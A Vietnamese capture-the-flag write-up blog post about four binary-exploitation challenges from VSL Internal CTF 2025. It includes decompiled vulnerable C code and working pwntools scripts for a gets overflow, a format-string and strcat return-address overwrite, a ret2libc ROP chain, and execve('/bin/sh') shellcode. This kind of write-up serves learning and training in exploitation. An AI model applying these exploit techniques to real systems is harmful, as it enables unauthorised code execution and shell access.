--- 
title: VSL Internal CTF 2025
date: 2025-03-06 00:00:00 +0800
categories: [writeup]
tags: [pwn]
author: "kuvee"
layout: post
---

- ở giải VSL lần này mình giải được full pwn (first solve 3 bài) và được top 5 , giải vừa kết thúc tầm 6 tiếng vì rảnh nên mình ghi writeup luôn :3 

![image](https://hackmd.io/_uploads/S1XLBUbDJl.png)


![image](https://hackmd.io/_uploads/r1XKcIMwJx.png)


## bofbegin


- bài này là 1 bài warm up thôi :v  

ta thấy ở đây nó yêu cầu nhập ```username``` và ```password``` , ```BOF``` cũng xảy ra ở 2 lần input() này , tiếp theo nó check ```v6``` có bằng ```ROOT_ID``` không?
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[12]; // [esp+4h] [ebp-28h] BYREF
  char v5[12]; // [esp+10h] [ebp-1Ch] BYREF
  int v6; // [esp+1Ch] [ebp-10h]
  unsigned int v7; // [esp+20h] [ebp-Ch]
  int *p_argc; // [esp+24h] [ebp-8h]

  p_argc = &argc;
  v7 = __readgsdword(0x14u);
  v6 = GUEST_ID;
  printf("Enter username: ");
  fflush(stdout);
  gets(s);
  printf("Enter password: ");
  fflush(stdout);
  gets(v5);
  if ( !strcmp(s, "admin") )
  {
    if ( v6 == ROOT_ID )
    {
      puts("Welcome, root!");
      fflush(stdout);
      system("/bin/sh");
    }
    else
    {
      if ( v6 == GUEST_ID )
        puts("Welcome, guest!");
      else
        puts("Nice try, but you are not root!");
      fflush(stdout);
    }
  }
  else
  {
    printf("Welcome, %s!\n", s);
    fflush(stdout);
  }
  return 0;
}
```

- okay chỉ cần overflow đúng giá trị (0x539) là ta sẽ có ```shell```

![image](https://hackmd.io/_uploads/SJpew8bP1e.png)

script 

cần chú ý là ở đây chỉ cần dùng p32() , p64() đôi lúc nó sẽ overflow giá trị khác -> xảy ra lỗi ngoài ý muốn
```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./bofbegin')

p = remote('61.14.233.78',2112)


p.sendline(b'admin')
p.sendline(b'a'*12 + p64(0x0000000000000539))
p.interactive()
```

![image](https://hackmd.io/_uploads/BJXXPLbwyg.png)


-----------

## Interesting Functions


- bài này thì như tên bài đã đề cập , chú ý đến các function , cụ thể là ```strcpy``` và ```strcat```

checksec : 

![image](https://hackmd.io/_uploads/B16g9I-Pye.png)

login bài khá dễ hiểu , ta có thể loop vô hạn , option1 là ta có thể dùng ```strcpy``` để sao chép dữ liệu từ ```g_buf``` vào ```v5``` , ở đây ta cần chú ý là ```strcpy``` sẽ không thêm byte NULL vào cuối chuỗi -> ta có thể leak dữ liệu nhưng điều này sẽ không sử dụng ở bài này

tiếp theo sẽ là option2 sử dụng ```strcat``` , hàm này sẽ thêm 1 chuỗi vào cuối chuỗi khác và ở đây khi suy nghĩ kĩ thì ta có thể sử dụng option1 và option2 để overwrite ret_add và ```get_shell```

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+0h] [rbp-110h] BYREF
  char v5[267]; // [rsp+1h] [rbp-10Fh] BYREF
  int v6; // [rsp+10Ch] [rbp-4h] BYREF

  memset(&s, 0, 0x101uLL);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  menu();
  while ( 1 )
  {
    while ( 1 )
    {
      printf("> ");
      if ( (unsigned int)__isoc99_scanf("%d%*c", &v6) != 1 )
        return 1;
      if ( v6 != 3 )
        break;
      if ( s )
      {
        puts("You only have one chance to print string");
      }
      else
      {
        printf(v5);
        s = 1;
      }
    }
    if ( v6 > 3 )
      break;
    if ( v6 == 1 )
    {
      get_data();
      strcpy(v5, g_buf);
    }
    else
    {
      if ( v6 != 2 )
        return 0;
      get_data();
      strcat(v5, g_buf);
    }
  }
  return 0;
}
```


- ở đây còn có 1 hàm quan trọng để lấy flag.txt

đoạn code này khá ý đồ :))  , nếu đoạn check nằm ở trên đoạn open thì ta chỉ việc overwrite ```ret_address``` nhảy đến open() luôn là xong , tuy nhiên thì ta cần phải overwrite dữ liệu của ```pwd``` trước để thõa yêu cầu của bài và option1 sẽ làm điều này 

![image](https://hackmd.io/_uploads/ryv8T8-vJe.png)

script 

```python
#!/usr/bin/python3


from pwn import *

context.binary = exe = ELF('./chall',checksec=False)


p = remote('61.14.233.78',1400)

change = 0x00000000004041C0

def strcpy(data):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'data: ',data)

def strcat(data):
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'data: ',data)
def printf_():
    p.sendlineafter(b'> ',b'3')
    
payload = b'%4919c%8$hn'
payload = payload.ljust(15,b'a')
payload += p64(change)
strcpy(payload)
printf_()
strcpy(b'a'*255)
strcat(b'z'*16 + p64(0xdeadbeefcafebabe) + p64(0xcafe401256))
strcat(b'k'*3 + p64(0xdeadbeefcafebabe) + p64(0xfe401256))
input()
strcat(b'v'*3 + p64(0xdeadbeefcafebabe) + p64(0x401256))


p.interactive()
```


## libcpwn


checksec : 

![image](https://hackmd.io/_uploads/SJ6HR8-wJl.png)



bài này đơn giản là ret2libc thôi và được cho sẵn địa chỉ libc và canary cũng tắt nên sẽ không giải thích nhiều
![image](https://hackmd.io/_uploads/SyzmCUZvJl.png)

script 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./libpwn_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
#p = process()
p = remote('61.14.233.78',8332)

pop_rdi = 0x000000000010f75b
p.recvuntil(b'This program is just a print function. Bye!')
p.recvlines(2)
libc.address = int(p.recvline()[:-1],16) - libc.sym.fgets
print(hex(libc.address))

payload = b'a'*0x30
payload += p64(0)
payload += p64(libc.address+pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(pop_rdi+1+libc.address)
payload += p64(libc.sym.system)
input()
p.sendline(payload)

p.interactive()
```

-------

## asm machine




bài cuối cùng khá hack não , nói chung là như 1 bài shellcode nhưng nó sẽ complie và run giùm ta , lúc đầu mình cứ tưởng là sẽ dùng kĩ thuật egghunter để đọc flag ở đâu đó trong bài nên khá loay hoay :v , chợt một lúc sau mình mới nhận ra là nó chỉ chạy đoạn mã asm đó cho ta 
![image](https://hackmd.io/_uploads/SJsqRUZDkx.png)



- vậy ta chỉ cần thực thi shellcode execve('/bin/sh') thôi là được

![image](https://hackmd.io/_uploads/HJCByD-vkx.png)


![image](https://hackmd.io/_uploads/SyA8kvbPkx.png)

```c
section .text
    global _start

_start:

    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx


    mov al, 11
    int 0x80
end
```